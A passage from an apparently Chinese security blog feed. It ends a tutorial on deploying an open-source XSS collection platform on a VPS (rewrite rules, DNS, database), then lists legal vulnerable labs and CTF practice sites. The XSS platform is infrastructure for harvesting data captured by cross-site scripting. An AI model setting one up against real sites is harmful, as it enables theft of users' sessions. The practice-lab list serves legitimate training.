新建站点</h2><p>首先需要在宝塔面板中新建一个站点叫<code>xss.你的域名.com</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163249.png" class="lozad"></p><p>需要从GitHub中下载xss平台的源码<a href="https://github.com/78778443/xssplatform" target="_blank" rel="noopener">传送门</a>，下载好源码后，上传到<code>xss.你的域名.com</code>站点下，记住，需要将压缩包的内容解压到站点根目录下。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163255.png" class="lozad"></p><h2 id="2-2设置伪静态"><a href="#2-2设置伪静态" class="headerlink" title="2.2设置伪静态"></a>2.2设置伪静态</h2><p>在网站-&gt;设置</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163305.png" class="lozad"></p><p>在伪静态中添加相关带代码</p><p>【apache方式】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteBase /</span><br><span class="line">RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L]</span><br><span class="line">RewriteRule ^do/auth/(\w+?)(/domain/([\w\.]+?))?$  /index.php?do=do&amp;auth=$1&amp;domain=$3 [L]</span><br><span class="line">RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L]</span><br><span class="line">RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>【nginx方式】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)&quot; /index.php?do=code&amp;urlKey=1 last;</span><br><span class="line">rewrite &quot;^/do/auth/(\w+?)(/domain/([\w.]+?))?&quot; /index.php?do=do&amp;auth=1&amp;domain=3 last;</span><br><span class="line">rewrite &quot;^/register/(.*?)&quot; /index.php?do=register&amp;key=1 last;</span><br><span class="line">rewrite &quot;^/register-validate/(.*?)&quot; /index.php?do=register&amp;act=validate&amp;key=$1 last;</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163316.png" class="lozad"></p><h2 id="2-2-设置域名解析"><a href="#2-2-设置域名解析" class="headerlink" title="2.2 设置域名解析"></a>2.2 设置域名解析</h2><p>添加域名解析，子域名设置为xss，记录为A ，记录值为VPS ip地址。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163328.png" class="lozad"></p><h2 id="2-4-设置数据库"><a href="#2-4-设置数据库" class="headerlink" title="2.4 设置数据库"></a>2.4 设置数据库</h2><p>宝塔面板中 ，数据库-&gt;添加数据库</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163340.png" class="lozad"></p><h2 id="2-5-开始安装"><a href="#2-5-开始安装" class="headerlink" title="2.5 开始安装"></a>2.5 开始安装</h2><p>输入域名开始安装</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163405.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163409.png" class="lozad"></p><p>然后点击下一步出现数据库导入成功就说明安装好了。</p><h1 id="0x06-使用"><a href="#0x06-使用" class="headerlink" title="0x06 使用"></a>0x06 使用</h1><p>输入域名访问</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163424.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163429.png" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试实战靶场</title>
      <link href="/2019/09/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/"/>
      <url>/2019/09/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在学习渗透测试的过程中，光学理论知识是不够的，还需要结合实战来进行学习。但是国家法律是不允许我们对互联网上的web站在未授权的情况下进行渗透测试的，所以我们只能通过自己搭建环境来进行学习。下面给大家分享一些靶场，免得大家再去寻找。</p><a id="more"></a><h1 id="0x01-Vulnerable-Web-Applications"><a href="#0x01-Vulnerable-Web-Applications" class="headerlink" title="0x01 Vulnerable Web Applications"></a>0x01 <strong>Vulnerable Web Applications</strong></h1><table><thead><tr><th>BadStore</th><th><a href="http://www.badstore.net/" target="_blank" rel="noopener">http://www.badstore.net/</a></th></tr></thead><tbody><tr><td>BodgeIt Store</td><td><a href="http://code.google.com/p/bodgeit/" target="_blank" rel="noopener">http://code.google.com/p/bodgeit/</a></td></tr><tr><td>Butterfly Security Project</td><td><a href="http://thebutterflytmp.sourceforge.net/" target="_blank" rel="noopener">http://thebutterflytmp.sourceforge.net/</a></td></tr><tr><td>bWAPP</td><td><a href="http://www.mmeit.be/bwapp/" target="_blank" rel="noopener">http://www.mmeit.be/bwapp/</a>  <a href="http://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">http://sourceforge.net/projects/bwapp/files/bee-box/</a></td></tr><tr><td>Commix</td><td><a href="https://github.com/stasinopoulos/commix-testbed" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix-testbed</a></td></tr><tr><td>CryptOMG</td><td><a href="https://github.com/SpiderLabs/CryptOMG" target="_blank" rel="noopener">https://github.com/SpiderLabs/CryptOMG</a></td></tr><tr><td>Damn Vulnerable Node Application (DVNA)</td><td><a href="https://github.com/quantumfoam/DVNA/" target="_blank" rel="noopener">https://github.com/quantumfoam/DVNA/</a></td></tr><tr><td>Damn Vulnerable Web App (DVWA)</td><td><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></td></tr><tr><td>Damn Vulnerable Web Services (DVWS)</td><td><a href="http://dvws.professionallyevil.com/" target="_blank" rel="noopener">http://dvws.professionallyevil.com/</a></td></tr><tr><td>Drunk Admin Web Hacking Challenge</td><td><a href="https://bechtsoudis.com/work-stuff/challenges/drunk-admin-web-hacking-challenge/" target="_blank" rel="noopener">https://bechtsoudis.com/work-stuff/challenges/drunk-admin-web-hacking-challenge/</a></td></tr><tr><td>Exploit KB Vulnerable Web App</td><td><a href="http://exploit.co.il/projects/vuln-web-app/" target="_blank" rel="noopener">http://exploit.co.il/projects/vuln-web-app/</a></td></tr><tr><td>Foundstone Hackme Bank</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-bank.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-bank.aspx</a></td></tr><tr><td>Foundstone Hackme Books</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx</a></td></tr><tr><td>Foundstone Hackme Casino</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx</a></td></tr><tr><td>Foundstone Hackme Shipping</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx</a></td></tr><tr><td>Foundstone Hackme Travel</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx</a></td></tr><tr><td>GameOver</td><td><a href="http://sourceforge.net/projects/null-gameover/" target="_blank" rel="noopener">http://sourceforge.net/projects/null-gameover/</a></td></tr><tr><td>hackxor</td><td><a href="http://hackxor.sourceforge.net/cgi-bin/index.pl" target="_blank" rel="noopener">http://hackxor.sourceforge.net/cgi-bin/index.pl</a></td></tr><tr><td>Hackazon</td><td><a href="https://github.com/rapid7/hackazon" target="_blank" rel="noopener">https://github.com/rapid7/hackazon</a></td></tr><tr><td>LAMPSecurity</td><td><a href="http://sourceforge.net/projects/lampsecurity/" target="_blank" rel="noopener">http://sourceforge.net/projects/lampsecurity/</a></td></tr><tr><td>Moth</td><td><a href="http://www.bonsai-sec.com/en/research/moth.php" target="_blank" rel="noopener">http://www.bonsai-sec.com/en/research/moth.php</a></td></tr><tr><td>NOWASP / Mutillidae 2</td><td><a href="http://sourceforge.net/projects/mutillidae/" target="_blank" rel="noopener">http://sourceforge.net/projects/mutillidae/</a></td></tr><tr><td>OWASP BWA</td><td><a href="http://code.google.com/p/owaspbwa/" target="_blank" rel="noopener">http://code.google.com/p/owaspbwa/</a></td></tr><tr><td>OWASP Hackademic</td><td><a href="http://hackademic1.teilar.gr/" target="_blank" rel="noopener">http://hackademic1.teilar.gr/</a></td></tr><tr><td>OWASP SiteGenerator</td><td><a href="https://www.owasp.org/index.php/Owasp_SiteGenerator" target="_blank" rel="noopener">https://www.owasp.org/index.php/Owasp_SiteGenerator</a></td></tr><tr><td>OWASP Bricks</td><td><a href="http://sourceforge.net/projects/owaspbricks/" target="_blank" rel="noopener">http://sourceforge.net/projects/owaspbricks/</a></td></tr><tr><td>OWASP Security Shepherd</td><td><a href="https://www.owasp.org/index.php/OWASP_Security_Shepherd" target="_blank" rel="noopener">https://www.owasp.org/index.php/OWASP_Security_Shepherd</a></td></tr><tr><td>PentesterLab</td><td><a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a></td></tr><tr><td>PHDays iBank CTF</td><td><a href="http://blog.phdays.com/2012/05/once-again-about-remote-banking.html" target="_blank" rel="noopener">http://blog.phdays.com/2012/05/once-again-about-remote-banking.html</a></td></tr><tr><td>SecuriBench</td><td><a href="http://suif.stanford.edu/~livshits/securibench/" target="_blank" rel="noopener">http://suif.stanford.edu/~livshits/securibench/</a></td></tr><tr><td>SentinelTestbed</td><td><a href="https://github.com/dobin/SentinelTestbed" target="_blank" rel="noopener">https://github.com/dobin/SentinelTestbed</a></td></tr><tr><td>SocketToMe</td><td><a href="http://digi.ninja/projects/sockettome.php" target="_blank" rel="noopener">http://digi.ninja/projects/sockettome.php</a></td></tr><tr><td>sqli-labs</td><td><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></td></tr><tr><td>MCIR (Magical Code Injection Rainbow)</td><td><a href="https://github.com/SpiderLabs/MCIR" target="_blank" rel="noopener">https://github.com/SpiderLabs/MCIR</a></td></tr><tr><td>sqlilabs</td><td><a href="https://github.com/himadriganguly/sqlilabs" target="_blank" rel="noopener">https://github.com/himadriganguly/sqlilabs</a></td></tr><tr><td>VulnApp</td><td><a href="http://www.nth-dimension.org.uk/blog.php?id=88" target="_blank" rel="noopener">http://www.nth-dimension.org.uk/blog.php?id=88</a></td></tr><tr><td>PuzzleMall</td><td><a href="http://code.google.com/p/puzzlemall/" target="_blank" rel="noopener">http://code.google.com/p/puzzlemall/</a></td></tr><tr><td>WackoPicko</td><td><a href="https://github.com/adamdoupe/WackoPicko" target="_blank" rel="noopener">https://github.com/adamdoupe/WackoPicko</a></td></tr><tr><td>WAED</td><td><a href="http://www.waed.info/" target="_blank" rel="noopener">http://www.waed.info</a></td></tr><tr><td>WebGoat.NET</td><td><a href="https://github.com/jerryhoff/WebGoat.NET" target="_blank" rel="noopener">https://github.com/jerryhoff/WebGoat.NET/</a></td></tr><tr><td>WebSecurity Dojo</td><td><a href="http://www.mavensecurity.com/web_security_dojo/" target="_blank" rel="noopener">http://www.mavensecurity.com/web_security_dojo/</a></td></tr><tr><td>XVWA</td><td><a href="https://github.com/s4n7h0/xvwa" target="_blank" rel="noopener">https://github.com/s4n7h0/xvwa</a></td></tr><tr><td>Zap WAVE</td><td><a href="http://code.google.com/p/zaproxy/downloads/detail?name=zap-wave-0.1.zip" target="_blank" rel="noopener">http://code.google.com/p/zaproxy/downloads/detail?name=zap-wave-0.1.zip</a></td></tr></tbody></table><h1 id="0x02-Vulnerable-Operating-System-Installations"><a href="#0x02-Vulnerable-Operating-System-Installations" class="headerlink" title="0x02 Vulnerable Operating System Installations"></a>0x02 <strong>Vulnerable Operating System Installations</strong></h1><table><thead><tr><th>21LTR</th><th><a href="http://21ltr.com/scenes/" target="_blank" rel="noopener">http://21ltr.com/scenes/</a></th></tr></thead><tbody><tr><td>Damn Vulnerable Linux</td><td><a href="http://sourceforge.net/projects/virtualhacking/files/os/dvl/" target="_blank" rel="noopener">http://sourceforge.net/projects/virtualhacking/files/os/dvl/</a></td></tr><tr><td>exploit-exercises - nebula, protostar, fusion</td><td><a href="http://exploit-exercises.com/download" target="_blank" rel="noopener">http://exploit-exercises.com/download</a></td></tr><tr><td>heorot: DE-ICE, hackerdemia</td><td><a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso" target="_blank" rel="noopener">http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso</a> <a href="http://hackingdojo.com/downloads/iso/De-ICE_S1.123.iso" target="_blank" rel="noopener">hackerdemia - http://hackingdojo.com/downloads/iso/De-ICE_S1.123.iso</a></td></tr><tr><td>Holynix</td><td><a href="http://sourceforge.net/projects/holynix/files/" target="_blank" rel="noopener">http://sourceforge.net/projects/holynix/files/</a></td></tr><tr><td>Kioptrix</td><td><a href="http://www.kioptrix.com/blog/" target="_blank" rel="noopener">http://www.kioptrix.com/blog/</a></td></tr><tr><td>LAMPSecurity</td><td><a href="http://sourceforge.net/projects/lampsecurity/" target="_blank" rel="noopener">http://sourceforge.net/projects/lampsecurity/</a></td></tr><tr><td>Metasploitable</td><td><a href="http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/" target="_blank" rel="noopener">http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/</a></td></tr><tr><td>neutronstar</td><td><a href="http://neutronstar.org/goatselinux.html" target="_blank" rel="noopener">http://neutronstar.org/goatselinux.html</a></td></tr><tr><td>PenTest Laboratory</td><td><a href="http://pentestlab.org/lab-in-a-box/" target="_blank" rel="noopener">http://pentestlab.org/lab-in-a-box/</a></td></tr><tr><td>Pentester Lab</td><td><a href="https://www.pentesterlab.com/exercises" target="_blank" rel="noopener">https://www.pentesterlab.com/exercises</a></td></tr><tr><td>pWnOS</td><td><a href="http://www.pwnos.com/" target="_blank" rel="noopener">http://www.pwnos.com/</a></td></tr><tr><td>RebootUser Vulnix</td><td><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></td></tr><tr><td>SecGame # 1: Sauron</td><td><a href="http://sg6-labs.blogspot.co.uk/2007/12/secgame-1-sauron.html" target="_blank" rel="noopener">http://sg6-labs.blogspot.co.uk/2007/12/secgame-1-sauron.html</a></td></tr><tr><td>scriptjunkie.us</td><td><a href="http://www.scriptjunkie.us/2012/04/the-hacker-games/" target="_blank" rel="noopener">http://www.scriptjunkie.us/2012/04/the-hacker-games/</a></td></tr><tr><td>UltimateLAMP</td><td><a href="http://www.amanhardikar.com/mindmaps/practice-links.html" target="_blank" rel="noopener">http://www.amanhardikar.com/mindmaps/practice-links.html</a></td></tr><tr><td>TurnKey Linux</td><td><a href="http://www.turnkeylinux.org/" target="_blank" rel="noopener">http://www.turnkeylinux.org/</a></td></tr><tr><td>Bitnami</td><td><a href="https://bitnami.com/stacks" target="_blank" rel="noopener">https://bitnami.com/stacks</a></td></tr><tr><td>Elastic Server</td><td><a href="http://elasticserver.com/" target="_blank" rel="noopener">http://elasticserver.com</a></td></tr><tr><td>OS Boxes</td><td><a href="http://www.osboxes.org/" target="_blank" rel="noopener">http://www.osboxes.org</a></td></tr><tr><td>VirtualBoxes</td><td><a href="http://virtualboxes.org/images/" target="_blank" rel="noopener">http://virtualboxes.org/images/</a></td></tr><tr><td>VirtualBox Virtual Appliances</td><td><a href="https://virtualboximages.com/" target="_blank" rel="noopener">https://virtualboximages.com/</a></td></tr><tr><td>CentOS</td><td><a href="http://www.centos.org/" target="_blank" rel="noopener">http://www.centos.org/</a></td></tr><tr><td>Default Windows Clients</td><td><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise" target="_blank" rel="noopener">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise</a>  <a href="https://dev.windows.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://dev.windows.com/en-us/microsoft-edge/tools/vms/</a></td></tr><tr><td>Default Windows Server</td><td><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-technical-preview" target="_blank" rel="noopener">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-technical-preview</a></td></tr><tr><td>Default VMWare vSphere</td><td><a href="http://www.vmware.com/products/vsphere/" target="_blank" rel="noopener">http://www.vmware.com/products/vsphere/</a></td></tr></tbody></table><h1 id="0x03-Sites-for-Downloading-Older-Versions-of-Various-Software"><a href="#0x03-Sites-for-Downloading-Older-Versions-of-Various-Software" class="headerlink" title="0x03 Sites for Downloading Older Versions of Various Software"></a>0x03 <strong>Sites for Downloading Older Versions of Various Software</strong></h1><table><thead><tr><th>Exploit-DB</th><th><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com/</a></th></tr></thead><tbody><tr><td>Old Apps</td><td><a href="http://www.oldapps.com/" target="_blank" rel="noopener">http://www.oldapps.com/</a></td></tr><tr><td>Old Version</td><td><a href="http://www.oldversion.com/" target="_blank" rel="noopener">http://www.oldversion.com/</a></td></tr><tr><td>VirtualHacking Repo</td><td><a href="https://www.amanhardikar.com/mindmaps/sourceforge.net/projects/virtualhacking/files/apps%40realworld/" target="_blank" rel="noopener">sourceforge.net/projects/virtualhacking/files/apps%40realworld/</a></td></tr></tbody></table><h1 id="0x04-Sites-by-Vendors-of-Security-Testing-Software"><a href="#0x04-Sites-by-Vendors-of-Security-Testing-Software" class="headerlink" title="0x04 Sites by Vendors of Security Testing Software"></a>0x04 <strong>Sites by Vendors of Security Testing Software</strong></h1><table><thead><tr><th>Acunetix acuforum</th><th><a href="http://testasp.vulnweb.com/" target="_blank" rel="noopener">http://testasp.vulnweb.com/</a></th></tr></thead><tbody><tr><td>Acunetix acublog</td><td><a href="http://testaspnet.vulnweb.com/" target="_blank" rel="noopener">http://testaspnet.vulnweb.com/</a></td></tr><tr><td>Acunetix acuart</td><td><a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">http://testphp.vulnweb.com/</a></td></tr><tr><td>Cenzic crackmebank</td><td><a href="http://crackme.cenzic.com/" target="_blank" rel="noopener">http://crackme.cenzic.com</a></td></tr><tr><td>HP freebank</td><td><a href="http://zero.webappsecurity.com/" target="_blank" rel="noopener">http://zero.webappsecurity.com</a></td></tr><tr><td>IBM altoromutual</td><td><a href="http://demo.testfire.net/" target="_blank" rel="noopener">http://demo.testfire.net/</a></td></tr><tr><td>Mavituna testsparker</td><td><a href="http://aspnet.testsparker.com/" target="_blank" rel="noopener">http://aspnet.testsparker.com</a></td></tr><tr><td>Mavituna testsparker</td><td><a href="http://php.testsparker.com/" target="_blank" rel="noopener">http://php.testsparker.com</a></td></tr><tr><td>NTOSpider Test Site</td><td><a href="http://www.webscantest.com/" target="_blank" rel="noopener">http://www.webscantest.com/</a></td></tr></tbody></table><h1 id="0x05-Sites-for-Improving-Your-Hacking-Skills"><a href="#0x05-Sites-for-Improving-Your-Hacking-Skills" class="headerlink" title="0x05 Sites for Improving Your Hacking Skills"></a>0x05 <strong>Sites for Improving Your Hacking Skills</strong></h1><table><thead><tr><th>Embedded Security CTF</th><th><a href="https://microcorruption.com/" target="_blank" rel="noopener">https://microcorruption.com</a></th></tr></thead><tbody><tr><td>EnigmaGroup</td><td><a href="http://www.enigmagroup.org/" target="_blank" rel="noopener">http://www.enigmagroup.org/</a></td></tr><tr><td>Escape</td><td><a href="http://escape.alf.nu/" target="_blank" rel="noopener">http://escape.alf.nu/</a></td></tr><tr><td>Google Gruyere</td><td><a href="http://google-gruyere.appspot.com/" target="_blank" rel="noopener">http://google-gruyere.appspot.com/</a></td></tr><tr><td>Gh0st Lab</td><td><a href="http://www.gh0st.net/" target="_blank" rel="noopener">http://www.gh0st.net/</a></td></tr><tr><td>Hack This Site</td><td><a href="http://www.hackthissite.org/" target="_blank" rel="noopener">http://www.hackthissite.org/</a></td></tr><tr><td>HackThis</td><td><a href="http://www.hackthis.co.uk/" target="_blank" rel="noopener">http://www.hackthis.co.uk/</a></td></tr><tr><td>HackQuest</td><td><a href="http://www.hackquest.com/" target="_blank" rel="noopener">http://www.hackquest.com/</a></td></tr><tr><td>Hack.me</td><td><a href="https://hack.me/" target="_blank" rel="noopener">https://hack.me</a></td></tr><tr><td>Hacking-Lab</td><td><a href="https://www.hacking-lab.com/" target="_blank" rel="noopener">https://www.hacking-lab.com</a></td></tr><tr><td>Hacker Challenge</td><td><a href="http://www.dareyourmind.net/" target="_blank" rel="noopener">http://www.dareyourmind.net/</a></td></tr><tr><td>Hacker Test</td><td><a href="http://www.hackertest.net/" target="_blank" rel="noopener">http://www.hackertest.net/</a></td></tr><tr><td>hACME Game</td><td><a href="http://www.hacmegame.org/" target="_blank" rel="noopener">http://www.hacmegame.org/</a></td></tr><tr><td>Halls Of Valhalla</td><td><a href="http://halls-of-valhalla.org/beta/challenges" target="_blank" rel="noopener">http://halls-of-valhalla.org/beta/challenges</a></td></tr><tr><td>Hax.Tor</td><td><a href="http://hax.tor.hu/" target="_blank" rel="noopener">http://hax.tor.hu/</a></td></tr><tr><td>OverTheWire</td><td><a href="http://www.overthewire.org/wargames/" target="_blank" rel="noopener">http://www.overthewire.org/wargames/</a></td></tr><tr><td>PentestIT</td><td><a href="http://www.pentestit.ru/en/" target="_blank" rel="noopener">http://www.pentestit.ru/en/</a></td></tr><tr><td>CSC Play on Demand</td><td><a href="https://pod.cybersecuritychallenge.org.uk/" target="_blank" rel="noopener">https://pod.cybersecuritychallenge.org.uk/</a></td></tr><tr><td>pwn0</td><td><a href="https://pwn0.com/home.php" target="_blank" rel="noopener">https://pwn0.com/home.php</a></td></tr><tr><td>RootContest</td><td><a href="http://rootcontest.com/" target="_blank" rel="noopener">http://rootcontest.com/</a></td></tr><tr><td>Root Me</td><td><a href="http://www.root-me.org/?lang=en" target="_blank" rel="noopener">http://www.root-me.org/?lang=en</a></td></tr><tr><td>Security Treasure Hunt</td><td><a href="http://www.securitytreasurehunt.com/" target="_blank" rel="noopener">http://www.securitytreasurehunt.com/</a></td></tr><tr><td>Smash The Stack</td><td><a href="http://www.smashthestack.org/" target="_blank" rel="noopener">http://www.smashthestack.org/</a></td></tr><tr><td>SQLZoo</td><td><a href="http://sqlzoo.net/hack/" target="_blank" rel="noopener">http://sqlzoo.net/hack/</a></td></tr><tr><td>TheBlackSheep and Erik</td><td><a href="http://www.bright-shadows.net/" target="_blank" rel="noopener">http://www.bright-shadows.net/</a></td></tr><tr><td>ThisIsLegal</td><td><a href="http://thisislegal.com/" target="_blank" rel="noopener">http://thisislegal.com/</a></td></tr><tr><td>Try2Hack</td><td><a href="http://www.try2hack.nl/" target="_blank" rel="noopener">http://www.try2hack.nl/</a></td></tr><tr><td>WabLab</td><td><a href="http://www.wablab.com/hackme" target="_blank" rel="noopener">http://www.wablab.com/hackme</a></td></tr><tr><td>XSS: Can You XSS This?</td><td><a href="http://canyouxssthis.com/HTMLSanitizer/" target="_blank" rel="noopener">http://canyouxssthis.com/HTMLSanitizer/</a></td></tr><tr><td>XSS Game</td><td><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">https://xss-game.appspot.com/</a></td></tr><tr><td>XSS: ProgPHP</td><td><a href="http://xss.progphp.com/" target="_blank" rel="noopener">http://xss.progphp.com/</a></td></tr></tbody></table><h1 id="0x06-CTF-Sites-Archives"><a href="#0x06-CTF-Sites-Archives" class="headerlink" title="0x06 CTF Sites / Archives"></a>0x06 <strong>CTF Sites / Archives</strong></h1><table><thead><tr><th>CAPTF Repo</th><th><a href="http://captf.com/" target="_blank" rel="noopener">http://captf.com/</a></th></tr></thead><tbody><tr><td>CTFtime (Details of CTF Challenges)</td><td><a href="http://ctftime.org/ctfs/" target="_blank" rel="noopener">http://ctftime.org/ctfs/</a></td></tr><tr><td>CTF write-ups repository</td><td><a href="https://github.com/ctfs" target="_blank" rel="noopener">https://github.com/ctfs</a></td></tr><tr><td>Reddit CTF Announcements</td><td><a href="http://www.reddit.com/r/securityctf" target="_blank" rel="noopener">http://www.reddit.com/r/securityctf</a></td></tr><tr><td>shell-storm Repo</td><td><a href="http://shell-storm.org/repo/CTF/" target="_blank" rel="noopener">http://shell-storm.org/repo/CTF/</a></td></tr><tr><td>VulnHub</td><td><a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com</a></td></tr></tbody></table><h1 id="0x07-Mobile-Apps"><a href="#0x07-Mobile-Apps" class="headerlink" title="0x07 Mobile Apps"></a>0x07 <strong>Mobile Apps</strong></h1><table><thead><tr><th>Damn Vulnerable Android App (DVAA)</th><th><a href="https://code.google.com/p/dvaa/" target="_blank" rel="noopener">https://code.google.com/p/dvaa/</a></th></tr></thead><tbody><tr><td>Damn Vulnerable FirefoxOS Application (DVFA)</td><td><a href="https://github.com/pwnetrationguru/dvfa/" target="_blank" rel="noopener">https://github.com/pwnetrationguru/dvfa/</a></td></tr><tr><td>Damn Vulnerable iOS App (DVIA)</td><td><a href="http://damnvulnerableiosapp.com/" target="_blank" rel="noopener">http://damnvulnerableiosapp.com/</a></td></tr><tr><td>ExploitMe Mobile Android Labs</td><td><a href="http://securitycompass.github.io/AndroidLabs/" target="_blank" rel="noopener">http://securitycompass.github.io/AndroidLabs/</a></td></tr><tr><td>ExploitMe Mobile iPhone Labs</td><td><a href="http://securitycompass.github.io/iPhoneLabs/" target="_blank" rel="noopener">http://securitycompass.github.io/iPhoneLabs/</a></td></tr><tr><td>Hacme Bank Android</td><td><a href="http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx</a></td></tr><tr><td>InsecureBank</td><td><a href="http://www.paladion.net/downloadapp.html" target="_blank" rel="noopener">http://www.paladion.net/downloadapp.html</a></td></tr><tr><td>NcN Wargame</td><td><a href="http://noconname.org/evento/wargame/" target="_blank" rel="noopener">http://noconname.org/evento/wargame/</a></td></tr><tr><td>OWASP iGoat</td><td><a href="http://code.google.com/p/owasp-igoat/" target="_blank" rel="noopener">http://code.google.com/p/owasp-igoat/</a></td></tr><tr><td>OWASP Goatdroid</td><td><a href="https://github.com/jackMannino/OWASP-GoatDroid-Project" target="_blank" rel="noopener">https://github.com/jackMannino/OWASP-GoatDroid-Project</a></td></tr></tbody></table><h1 id="0x08-Lab"><a href="#0x08-Lab" class="headerlink" title="0x08 Lab"></a>0x08 <strong>Lab</strong></h1><table><thead><tr><th>binjitsu</th><th><a href="https://github.com/binjitsu/binjitsu" target="_blank" rel="noopener">https://github.com/binjitsu/binjitsu</a></th></tr></thead><tbody><tr><td>CTFd</td><td><a href="https://github.com/isislab/CTFd" target="_blank" rel="noopener">https://github.com/isislab/CTFd</a></td></tr><tr><td>Mellivora</td><td><a href="https://github.com/Nakiami/mellivora" target="_blank" rel="noopener">https://github.com/Nakiami/mellivora</a></td></tr><tr><td>NightShade</td><td><a href="https://github.com/UnrealAkama/NightShade" target="_blank" rel="noopener">https://github.com/UnrealAkama/NightShade</a></td></tr><tr><td>MCIR</td><td><a href="https://github.com/SpiderLabs/MCIR" target="_blank" rel="noopener">https://github.com/SpiderLabs/MCIR</a></td></tr><tr><td>Docker</td><td><a href="https://www.docker.com/" target="_blank" rel="noopener">https://www.docker.com/</a></td></tr><tr><td>Vagrant</td><td><a href="https://www.vagrantup.com/" target="_blank" rel="noopener">https://www.vagrantup.com/</a></td></tr><tr><td>NETinVM</td><td><a href="http://informatica.uv.es/~carlos/docencia/netinvm/" target="_blank" rel="noopener">http://informatica.uv.es/~carlos/docencia/netinvm/</a></td></tr><tr><td>SmartOS</td><td><a href="https://smartos.org/" target="_blank" rel="noopener">https://smartos.org/</a></td></tr><tr><td>SmartDataCenter</td><td><a href="https://github.com/joyent/sdc" target="_blank" rel="noopener">https://github.com/joyent/sdc</a></td></tr><tr><td>vSphere Hypervisor</td><td><a href="https://www.vmware.com/products/vsphere-hypervisor/" target="_blank" rel="noopener">https://www.vmware.com/products/vsphere-hypervisor/</a></td></tr><tr><td>GNS3</td><td><a 